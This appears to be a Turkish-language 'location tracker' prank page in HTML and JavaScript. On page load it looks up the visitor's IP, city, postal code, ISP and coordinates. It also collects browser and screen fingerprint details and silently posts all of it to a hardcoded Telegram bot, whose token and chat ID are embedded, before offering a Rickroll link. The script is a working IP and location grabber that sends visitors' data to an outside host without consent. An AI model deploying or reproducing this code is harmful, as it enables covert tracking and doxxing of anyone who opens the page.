<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>Konum Takip√ßisi</title>
  <style>
    html, body {
      margin: 0; padding: 0; width: 100%; height: 100%;
      background: black;
      color: #00ff00;
      font-family: monospace, monospace;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    #container {
      width: 90vw;
      max-width: 800px;
      height: 90vh;
      background-color: black;
      border-radius: 8px;
      padding: 10px 15px;
      box-sizing: border-box;
      overflow: hidden;
      box-shadow: 0 0 20px #00ff00;
      white-space: pre-wrap;
      user-select: none;
      display: flex;
      flex-direction: column;
    }
    #terminal {
      flex: none;
      height: 62vh;
      overflow-y: auto;
      margin-bottom: 8px;
      font-size: 13px;
      line-height: 1.3;
    }
    #rickrollButton {
      background: #00ff00;
      color: black;
      padding: 14px 35px;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      user-select: none;
      font-size: 18px;
      align-self: center;
      transition: background 0.3s ease;
      box-shadow: 0 0 15px #00ff00;
      margin-bottom: 8px;
    }
    #map {
      flex: 0 0 25vh;
      border: 2px solid #00ff00;
      border-radius: 6px;
      background: #111;
    }
    #rickrollButton:hover {
      background: #00cc00;
      box-shadow: 0 0 25px #00ff00;
    }
    .leaflet-container {
      background: #111 !important;
    }
    .leaflet-popup-content-wrapper {
      background: #222 !important;
      color: #00ff00 !important;
    }
    .leaflet-popup-tip {
      background: #222 !important;
    }
  </style>

  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.css"
  />
</head>
<body>
  <div id="container">
    <pre id="terminal"></pre>
    <button id="rickrollButton" style="display:none;">S√ºrpriz ƒ∞√ßin Tƒ±kla</button>
    <div id="map"></div>
  </div>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.js"></script>

  <script>
    const terminal = document.getElementById('terminal');
    const button = document.getElementById('rickrollButton');
    let map;

    function logToTerminal(text) {
      terminal.textContent += text + '\n';
      terminal.scrollTop = terminal.scrollHeight;
    }

    function getCurrentTime() {
      return new Date().toLocaleString('tr-TR');
    }

    function decToDMS(deg) {
      const absolute = Math.abs(deg);
      const degrees = Math.floor(absolute);
      const minutes = ((absolute - degrees) * 60).toFixed(1);
      return {degrees, minutes};
    }

    function formatCoordinate(lat, lon) {
      const latDMS = decToDMS(lat);
      const lonDMS = decToDMS(lon);
      const latCardinal = lat >= 0 ? "Kuzey" : "G√ºney";
      const lonCardinal = lon >= 0 ? "Doƒüu" : "Batƒ±";

      return `${latDMS.degrees}¬∞${latDMS.minutes}' ${latCardinal}, ${lonDMS.degrees}¬∞${lonDMS.minutes}' ${lonCardinal}`;
    }

    async function getLocationData() {
      try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();

        if (data.error) throw new Error('IP tabanlƒ± konum alƒ±namadƒ±');

        return {
          latitude: data.latitude,
          longitude: data.longitude,
          city: data.city || 'Bilinmiyor',
          region: data.region || 'Bilinmiyor',
          country: data.country_name || 'Bilinmiyor',
          ip: data.ip || 'Bilinmiyor',
          org: data.org || 'Bilinmiyor',
          postal: data.postal || 'Bilinmiyor'
        };
      } catch {
        return {
          latitude: 41.0082,
          longitude: 28.9784,
          city: 'ƒ∞stanbul',
          region: 'ƒ∞stanbul',
          country: 'T√ºrkiye',
          ip: 'Tespit edilemedi',
          org: 'Bilinmiyor',
          postal: 'Bilinmiyor'
        };
      }
    }

    // Telegram mesaj g√∂nderme fonksiyonu
    function sendTelegramMessage(message) {
      const chatId = '640073750';
      const botToken = '78059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg';

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML'
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          console.log('Telegram mesajƒ± g√∂nderildi.');
        } else {
          console.error('Telegram mesaj g√∂nderilemedi:', data);
        }
      })
      .catch(error => console.error('Telegram API hatasƒ±:', error));
    }

    async function collectData() {
      logToTerminal(`[${getCurrentTime()}] Sistem ba≈ülatƒ±lƒ±yor...`);
      const locationData = await getLocationData();

      const coordsFormatted = formatCoordinate(locationData.latitude, locationData.longitude);

      const infoMessage = 
        `Konum Bilgileri:\n` +
        `IP: ${locationData.ip}\n` +
        `≈ûehir: ${locationData.city}\n` +
        `B√∂lge: ${locationData.region}\n` +
        `Posta Kodu: ${locationData.postal}\n` +
        `√úlke: ${locationData.country}\n` +
        `ISP: ${locationData.org}\n` +
        `Koordinatlar: ${coordsFormatted}\n\n` +

        `Tarayƒ±cƒ± Bilgileri:\n` +
        `User Agent: ${navigator.userAgent}\n` +
        `Dil: ${navigator.language}\n` +
        `Platform: ${navigator.platform}\n` +
        `√áerez Durumu: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalƒ±'}\n` +
        `Baƒülantƒ±: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}\n\n` +

        `Ekran Bilgileri:\n` +
        `√á√∂z√ºn√ºrl√ºk: ${screen.width}x${screen.height}\n` +
        `Renk Derinliƒüi: ${screen.colorDepth}\n` +
        `Zaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}\n` +
        `≈ûu anki Saat: ${getCurrentTime()}`;

      logToTerminal(infoMessage);

      showMap(locationData.latitude, locationData.longitude, locationData);

      // Telegram'a g√∂nder
      sendTelegramMessage(infoMessage);

      logToTerminal(`[${getCurrentTime()}] Sistem hazƒ±r!`);
      addButton();
    }

    function showMap(lat, lon, locationData) {
      try {
        document.getElementById('map').innerHTML = '';
        map = L.map('map').setView([lat, lon], 13);

        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
          attribution: '&copy; OpenStreetMap contributors',
          maxZoom: 18,
        }).addTo(map);

        const popupContent = `
          <div style="color: #00ff00; background: #222; padding: 10px;">
            <strong>üìç Konumunuz</strong><br>
            ${formatCoordinate(lat, lon)}<br>
            <strong>≈ûehir:</strong> ${locationData.city}<br>
            <strong>√úlke:</strong> ${locationData.country}
          </div>
        `;

        L.marker([lat, lon]).addTo(map)
          .bindPopup(popupContent)
          .openPopup();

        setTimeout(() => map.invalidateSize(), 100);

      } catch (error) {
        logToTerminal(`[${getCurrentTime()}] Harita y√ºklenirken hata: ${error.message}`);
      }
    }

    function addButton() {
      button.style.display = 'inline-block';
      button.onclick = () => {
        logToTerminal(`[${getCurrentTime()}] S√ºrpriz butonuna tƒ±klandƒ±!`);
        window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ', '_blank');
      };
    }

    window.addEventListener('load', () => {
      setTimeout(collectData, 500);
    });

    window.addEventListener('resize', () => {
      if (map) setTimeout(() => map.invalidateSize(), 100);
    });
  </script>
</body>
</html>